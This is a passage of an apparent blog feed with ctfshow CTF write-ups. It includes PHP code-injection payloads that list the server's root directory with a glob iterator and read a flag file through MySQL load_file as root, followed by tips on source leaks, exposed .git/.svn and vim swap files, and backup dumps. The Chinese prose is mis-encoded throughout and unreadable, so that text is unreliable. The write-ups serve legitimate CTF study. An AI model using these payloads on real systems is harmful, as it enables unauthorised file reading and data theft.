class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨PDOï¼ˆPHP Data Objectsï¼‰åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“è¿æ¥å¯¹è±¡ï¼ŒæŒ‡å®šDSNã€ç”¨æˆ·åï¼ˆrootï¼‰å’Œå¯†ç ï¼ˆrootï¼‰</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‰§è¡Œä¸€ä¸ªSQLæŸ¥è¯¢ï¼Œä»æŒ‡å®šçš„æ–‡ä»¶ï¼ˆ/flag36.txtï¼‰ä¸­è¯»å–å†…å®¹</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">        <span class="comment">// è¾“å‡ºè¯»å–åˆ°çš„å†…å®¹ï¼Œå¹¶è¿½åŠ ä¸€ä¸ªç«–çº¿ï¼ˆ|ï¼‰</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å°†æ•°æ®åº“è¿æ¥å¯¹è±¡è®¾ç½®ä¸ºnullï¼Œå…³é—­è¿æ¥</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå‘ç”ŸPDOå¼‚å¸¸ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    <span class="comment">// ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web76"><a class="markdownIt-Anchor" href="#web76">#</a> Web76ï¼š</h1><p>â€‹è¿˜æ˜¯ glob è¯»æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹è¿˜æ˜¯è€æ ·å­ï¼ŒMySQL è¯»æ–‡ä»¶ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="ä¸€äº›æ€»ç»“æ–‡ç« "><a class="markdownIt-Anchor" href="#ä¸€äº›æ€»ç»“æ–‡ç« ">#</a> ä¸€äº›æ€»ç»“æ–‡ç« ï¼š</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzE1OTU3L2FydGljbGUvZGV0YWlscy8xMTg4NTU4NjU/b3BzX3JlcXVlc3RfbWlzYz0mYW1wO3JlcXVlc3RfaWQ9JmFtcDtiaXpfaWQ9MTAyJmFtcDt1dG1fdGVybT1saW51eCVFNSU4RiU5NiVFNSU4RiU4RCVFNSU5MSVCRCVFNCVCQiVBNHJjZSVFOCU4NCU5QSVFNiU5QyVBQyZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+c29iYWlkdXdlYn5kZWZhdWx0LTEtMTE4ODU1ODY1LjE0MiU1RXYxMDAlNUVwY19zZWFyY2hfcmVzdWx0X2Jhc2U2JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">æ€»ç»“ rceï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œå„ç§ sao å§¿åŠ¿ï¼‰ç»•è¿‡ bypass</span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web29&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web29&quot;&gt;#&lt;/a&gt; Web29ï¼š&lt;/h1&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-ä¿¡æ¯æœé›†</title>
    <link href="http://blog.g01den.top/posts/97a7dff3.html"/>
    <id>http://blog.g01den.top/posts/97a7dff3.html</id>
    <published>2024-09-14T08:55:17.000Z</published>
    <updated>2024-09-14T09:06:10.494Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web1"><a class="markdownIt-Anchor" href="#web1">#</a> Web1ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤ ã€‚</p><p>â€‹æ‰“å¼€é¢˜ç›®åæç¤º web1:where is flag?</p><p>â€‹ctrl+u è¯»å–æºç ã€‚</p><h1 id="web2"><a class="markdownIt-Anchor" href="#web2">#</a> Web2ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šjs å‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</p><p>â€‹æ‰“å¼€é¢˜ç›®åæ˜¾ç¤ºï¼šæ— æ³•æŸ¥çœ‹æºä»£ç </p><p>â€‹å³é”®æ— æ³•ç”¨ï¼Œä½†æ˜¯ ctrl+u å¯ä»¥ç”¨ã€‚</p><h1 id="web3"><a class="markdownIt-Anchor" href="#web3">#</a> Web3ï¼š</h1><p>â€‹æç¤ºè¦æŠ“åŒ…ï¼Œé‚£å°±æŠ“åŒ…ï¼Œå‘é€åˆ° repeaterï¼Œå“åº”å¤´é‡Œå‘ç° flagã€‚</p><h1 id="web4"><a class="markdownIt-Anchor" href="#web4">#</a> Web4ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šæ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥ robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</p><p>â€‹åŸºç¡€çŸ¥è¯†ï¼šRobots åè®®ï¼ˆä¹Ÿç§°<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclODglQUMlRTglOTklQUImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">çˆ¬è™«</span>åè®®ï¼Œæœºå™¨äººåè®®ç­‰ï¼‰çš„å…¨ç§°æ˜¯ â€œç½‘ç»œçˆ¬è™«æ’é™¤åè®®â€ï¼Œç½‘ç«™é€šè¿‡ Robots åè®®å‘Šè¯‰æœç´¢å¼•æ“å“ªäº›é¡µé¢å¯ä»¥æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½æŠ“å–ã€‚</p><blockquote><p>Robots å‚æ•°ï¼š</p><p>User-agentï¼š</p><p>ä½œç”¨ï¼šç”¨äºæè¿°æœç´¢å¼•æ“èœ˜è››çš„åå­—ï¼›</p><p>æŠ€å·§ï¼š</p><p>1ï¼Œå½“ robots.txt ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œå¿…é¡»è‡³å°‘æœ‰ä¸€æ¡ user-agent çš„è®°å½•ï¼›</p><p>2ï¼Œç›¸åŒåå­—ï¼Œåªèƒ½æœ‰ä¸€æ¡ï¼Œä½†æ˜¯ä¸åŒçš„èœ˜è››ï¼Œå¯ä»¥æœ‰å¤šæ¡è®°å½•ï¼›</p><p>Disallowï¼š</p><p>ä½œç”¨ï¼šç”¨äºæè¿°ä¸å…è®¸æœç´¢å¼•æ“èœ˜è››çˆ¬è¡Œå’ŒæŠ“å–çš„ urlï¼›</p><p>ä½¿ç”¨æŠ€å·§ï¼š</p><p>åœ¨ robots.txt ä¸­è‡³å°‘è¦æœ‰ä¸€æ¡ disallowï¼›<br>Disallow è®°å½•ä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºç½‘ç«™æ‰€æœ‰é¡µé¢éƒ½å…è®¸è¢«æŠ“å–ï¼›<br>ä½¿ç”¨ disallowï¼Œæ¯ä¸ªé¡µé¢å¿…é¡»å•ç‹¬åˆ†å¼€å£°æ˜ï¼›<br>æ³¨æ„ disallowï¼š/abc/ å’Œ disallowï¼š/abc çš„åŒºåˆ«ï¼›</p><p>Allowï¼š</p><p>ä½œç”¨ï¼šç”¨äºæè¿°æœç´¢å¼•æ“èœ˜è››çˆ¬è¡Œå’ŒæŠ“å–çš„ urlï¼›</p><p>ä½¿ç”¨æŠ€å·§ï¼šæœç´¢å¼•æ“é»˜è®¤æ‰€æœ‰çš„ url æ˜¯ Allowï¼›</p></blockquote><p>â€‹è®¿é—® robots.txt æ–‡ä»¶å‘ç°å¦‚ä¸‹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /flagishere.txt</span><br></pre></td></tr></table></figure><p>â€‹è®¿é—®è¿™ä¸ªæ–‡ä»¶åå¾—åˆ° flagã€‚</p><h1 id="web5"><a class="markdownIt-Anchor" href="#web5">#</a> Web5ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šphps æºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</p><p>â€‹å‰ç½®çŸ¥è¯†ï¼š<strong>phps æ–‡ä»¶</strong>å°±æ˜¯ php çš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰ç›´æ¥é€šè¿‡ Web æµè§ˆå™¨æŸ¥çœ‹ php ä»£ç çš„å†…å®¹ã€‚</p><p>â€‹è®¿é—® index.phps æ–‡ä»¶ä¸‹è½½åæ‰“å¼€å³å¯å¾—åˆ° flagã€‚</p><h1 id="web6"><a class="markdownIt-Anchor" href="#web6">#</a> Web6ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šè§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â€ƒâ€ƒå¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€ï¼š</span><br><span class="line"></span><br><span class="line">tar</span><br><span class="line">tar.gz</span><br><span class="line">zip</span><br><span class="line">rar</span><br><span class="line">â€ƒâ€ƒå¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åï¼š</span><br><span class="line">web</span><br><span class="line">website</span><br><span class="line">backup</span><br><span class="line">back</span><br><span class="line">www</span><br><span class="line">wwwroot</span><br><span class="line">temp</span><br></pre></td></tr></table></figure><p>â€‹è®¿é—® www.zip è·å¾—æºç ï¼Œé‡Œé¢æœ‰ flagã€‚</p><h1 id="web7"><a class="markdownIt-Anchor" href="#web7">#</a> Web7ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p><p>â€‹git æ³„éœ²ï¼Œç›´æ¥è®¿é—® /.git/ å³å¯ï¼Œæˆ–è€… Githack ä¸€æŠŠæ¢­ã€‚</p><h1 id="web8"><a class="markdownIt-Anchor" href="#web8">#</a> Web8ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p><p>â€‹.svn æ³„éœ²ï¼Œç›´æ¥è®¿é—®ã€‚</p><h1 id="web9"><a class="markdownIt-Anchor" href="#web9">#</a> Web9ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒ vim æ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</p><pre><code>vimæ³„éœ²ï¼šå½“vimå¼‚å¸¸é€€å‡ºæ—¶ï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªç”¨äºå¤‡ä»½ç¼“å†²åŒºå†…å®¹çš„swpä¸´æ—¶æ–‡ä»¶ï¼Œæ¥è®°å½•äº†ç”¨æˆ·åœ¨éæ­£å¸¸å…³é—­vimç¼–è¾‘å™¨ä¹‹å‰æœªèƒ½åŠæ—¶ä¿å­˜çš„ä¿®æ”¹ï¼Œç”¨äºæ–‡ä»¶æ¢å¤ã€‚å‡å¦‚åŸæ–‡ä»¶åä¸ºindex.phpç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º.index.php.swpç¬¬äºŒæ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º.index.php.swoç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º.index.php.swn</code></pre><p>â€‹è®¿é—®è¿™ä¸ªæ–‡ä»¶ <code>index.php.swp</code> ï¼Œç„¶åè®°äº‹æœ¬æ‰“å¼€æ‹¿åˆ° flagã€‚</p><h1 id="web10"><a class="markdownIt-Anchor" href="#web10">#</a> Web10ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šcookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®ã€‚</p><p>â€‹æŠ“åŒ…ï¼Œåœ¨ cookie å¤„å‘ç° flagã€‚</p><h1 id="web11"><a class="markdownIt-Anchor" href="#web11">#</a> Web11ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šåŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œ<span class="exturl" data-url="aHR0cDovL3huLS1mbGFnLWY5NmczMTVnLmN0ZnNob3cuY29t">æ¯”å¦‚ flag.ctfshow.com</span> å°±éšè—äº†ä¸€æ¡ä¿¡æ¯</p><p>â€‹<span class="exturl" data-url="aHR0cHM6Ly9ib2NlLmFsaXl1bi5jb20vaG9tZSVFOSU4NyU4QyVFOSU5RCVBMiVFNiU5RiVBNSVFNCVCRiVBMSVFNiU4MSVBRiVFRiVCQyU4QyVFNCVCRCU4NiVFNiU5OCVBRiVFNiU4OCU5MSVFNCVCOCU4RCVFNyU5RiVBNSVFOSU4MSU5MyVFNCVCOCVCQSVFNSU5NSVBNSVFNiU5RiVBNSVFNCVCOCU4RCVFNSU4OCVCMCVFRiVCQyU4QyVFNCVCOCU4RCVFNyVBRSVBMSVFNCVCQSU4NiVFMyU4MCU4Mg==">https://boce.aliyun.com/home é‡Œé¢æŸ¥ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“ä¸ºå•¥æŸ¥ä¸åˆ°ï¼Œä¸ç®¡äº†ã€‚</span></p><h1 id="web12"><a class="markdownIt-Anchor" href="#web12">#</a> Web12ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šæœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </p><p>â€‹è®¿é—® robots.txt è·å–ä¸€äº›ä¿¡æ¯ï¼Œå°±æ˜¯ /admin/ ç›®å½•ï¼Œè®¿é—®åå¼¹å‡ºæ¥äº†ä¸ªç™»é™†æ¡†ï¼Œå¯†ç ä¸€èˆ¬æ˜¯ adminï¼Œå¯†ç åœ¨ index é¡µé¢æœ€ä¸‹é¢ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Help Line Number : 372619038</span><br></pre></td></tr></table></figure><h1 id="web13"><a class="markdownIt-Anchor" href="#web13">#</a> Web13ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šæŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </p><p>â€‹è¯»æºç ï¼Œå‘ç° document.pdf æ–‡ä»¶ï¼Œæ‰“å¼€å‘ç°äº†è´¦å·å¯†ç å’Œä¸€ä¸ªé¡µé¢ï¼Œè¿›å…¥è¿™ä¸ªæ–‡ä»¶åç™»é™†å‘ç° flagã€‚</p><h1 id="web14"><a class="markdownIt-Anchor" href="#web14">#</a> Web14ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šæœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦ (editor) çš„ä¿¡æ¯ï¼Œé»˜è®¤é…ç½®å®³æ­»äºº</p><p>â€‹ç›´æ¥è®¿é—® /editor/ ç›®å½•ï¼Œç‚¹æ’å…¥æ–‡ä»¶ï¼Œæ‰¾åˆ° flag æ–‡ä»¶çš„å¤§è‡´æ–‡ä»¶ç»“æ„ï¼Œç›¸å¯¹è·¯å¾„è®¿é—®å³å¯å¾—åˆ° flagã€‚</p><h1 id="web15"><a class="markdownIt-Anchor" href="#web15">#</a> Web15ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼›å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</p><p>â€‹ç¤¾å·¥é¢˜ï¼Œå¯¹çœŸæ­£æŠ€æœ¯æ²¡å•¥å¤ªå¤§çš„å…³ç³»ã€‚</p><p>â€‹ç›´æ¥æ‹‰åˆ°æœ€ä¸‹è¾¹ï¼Œç”µè¯å·ç å’Œé‚®ç®±éƒ½æœ‰ï¼Œurl ç›´æ¥è®¿é—® adminï¼Œè¿›å…¥ç™»é™†åå°ï¼Œä¹‹åå°±æ˜¯å¿˜è®°å¯†ç ï¼Œæç¤ºï¼šæˆ‘çš„æ‰€åœ¨åœ°æ˜¯å“ªä¸ªåŸå¸‚ï¼Ÿæ ¹æ® qq é‚®ç®±çš„ qq å·å‘ç°å±åœ°ï¼Œé€šè¿‡è¿™ä¸ªä¿®æ”¹å¯†ç å³å¯ã€‚</p><h1 id="web16"><a class="markdownIt-Anchor" href="#web16">#</a> Web16ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</p><p>â€‹æœ‰å¤§ä½¬ç”¨ Wappalyzer æ£€æµ‹åˆ°äº† PHPï¼Œä½†æ˜¯è®¿é—® tz.php çš„åŸå› æ˜¯å•¥ä¸æ˜¯å¾ˆæ¸…æ¥šã€‚æ‰“å¼€ tz.php ä¹‹åæ‰¾åˆ° PHP ç›¸å…³å‚æ•°ï¼Œæ‰“å¼€ PHPIINFO ç„¶åæœç´¢ ctfshow å³å¯å‘ç° flagã€‚</p><h1 id="web17"><a class="markdownIt-Anchor" href="#web17">#</a> Web17ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå¤‡ä»½çš„ sql æ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</p><p>â€‹sql æ–‡ä»¶çš„å¤‡ä»½ä¸€èˆ¬ä¸º backup.sqlï¼Œæ‰€ä»¥è®¿é—®ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ï¼Œè®°äº‹æœ¬æ‰“å¼€ä¹‹åæ‰¾åˆ°äº†å¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `ctfshow_secret` <span class="keyword">VALUES</span> (<span class="string">&#x27;ctfshow&#123;40b3ed5b-2454-49c7-a6ad-77e5cc738e2f&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="web18"><a class="markdownIt-Anchor" href="#web18">#</a> Web18ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç© 101 åˆ†ç»™ä½  flag</p><p>â€‹è¯» js æºç ï¼Œæ‰¾åˆ°ä»¥ä¸‹é€»è¾‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹unicode è§£ç æ˜¯ï¼šä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹ï¼Œæç¤ºè¯»å– 110.phpï¼Œè¯»å–åè·å¾— flagã€‚</p><h1 id="web19"><a class="markdownIt-Anchor" href="#web19">#</a> Web19ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</p><p>â€‹è¯»æºç ï¼Œæ‰¾åˆ°äº†è¢«æ³¨é‡Šçš„ php ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    &lt;!--</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure><p>â€‹è´¦å·å¯†ç éƒ½æœ‰äº†ï¼Œåç«¯æŠ“åŒ…æ”¹åŒ…å‘é€å³å¯è·å¾— flagã€‚</p><h1 id="web20"><a class="markdownIt-Anchor" href="#web20">#</a> Web20ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šmdb æ–‡ä»¶æ˜¯æ—©æœŸ asp+access æ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</p><p>â€‹æ‰«åå°å‘ç°äº† db æ–‡ä»¶ï¼Œä¸‹è½½å³å¯ï¼Œä¹‹åç”¨æ•°æ®åº“ç®¡ç†å·¥å…·æ‰“å¼€å³å¯å¾—åˆ° flagã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web1&quot;&gt;#&lt;/a&gt; Web1ï¼š&lt;/h1&gt;
&lt;p&gt;â€‹		é¢˜ç›®æè¿°ï¼šå¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤ ã€‚&lt;/p&gt;
&lt;p&gt;â€‹		æ‰“å¼€é¢˜ç›®åæç¤º web1:where is flag?&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ9ï¼‰-ä¸­çº§ROP--ret2csu</title>
    <link href="http://blog.g01den.top/posts/c8624158.html"/>
    <id>http://blog.g01den.top/posts/c8624158.html</id>
    <published>2024-08-08T18:55:43.000Z</published>
    <updated>2024-08-18T16:45:41.372Z</updated>
    
